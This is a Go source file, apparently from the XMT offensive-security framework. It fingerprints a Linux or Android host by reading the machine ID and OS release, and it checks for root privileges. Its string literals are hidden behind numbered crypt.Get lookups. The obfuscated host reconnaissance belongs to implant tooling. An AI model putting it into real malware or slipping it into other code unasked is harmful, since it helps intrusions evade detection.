//go:build (android || linux) && crypt

package local

import (
	"os"
	"os/user"

	"github.com/iDigitalFlame/xmt/util/crypt"
)

func sysID() []byte {
	b, err := os.ReadFile(crypt.Get(90)) // /var/lib/dbus/machine-id
	if err == nil {
		return b
	}
	b, _ = os.ReadFile(crypt.Get(91)) // /etc/machine-id
	return b
}
func version() string {
	var (
		ok      bool
		b, n, v string
	)
	if m := release(); len(m) > 0 {
		b = m[crypt.Get(92)]               // ID
		if n, ok = m[crypt.Get(93)]; !ok { // PRETTY_NAME
			n = m[crypt.Get(94)] // NAME
		}
		if v, ok = m[crypt.Get(95)]; !ok { // VERSION_ID
			v = m[crypt.Get(96)] // VERSION
		}
	}
	if len(v) == 0 {
		v = uname()
	}
	switch {
	case len(n) == 0 && len(b) == 0 && len(v) == 0:
		return crypt.Get(21) // Linux
	case len(n) == 0 && len(b) > 0 && len(v) > 0:
		return crypt.Get(21) + " (" + v + ", " + b + ")" // Linux
	case len(n) == 0 && len(b) == 0 && len(v) > 0:
		return crypt.Get(21) + " (" + v + ")" // Linux
	case len(n) == 0 && len(b) > 0 && len(v) == 0:
		return crypt.Get(21) + " (" + b + ")" // Linux
	case len(n) > 0 && len(b) > 0 && len(v) > 0:
		return n + " (" + v + ", " + b + ")"
	case len(n) > 0 && len(b) == 0 && len(v) > 0:
		return n + " (" + v + ")"
	case len(n) > 0 && len(b) > 0 && len(v) == 0:
		return n + " (" + b + ")"
	}
	return crypt.Get(21) // Linux
}
func isElevated() uint8 {
	if os.Geteuid() == 0 || os.Getuid() == 0 {
		return 1
	}
	if a, err := user.Current(); err == nil && a.Uid == "0" {
		return 1
	}
	return 0
}
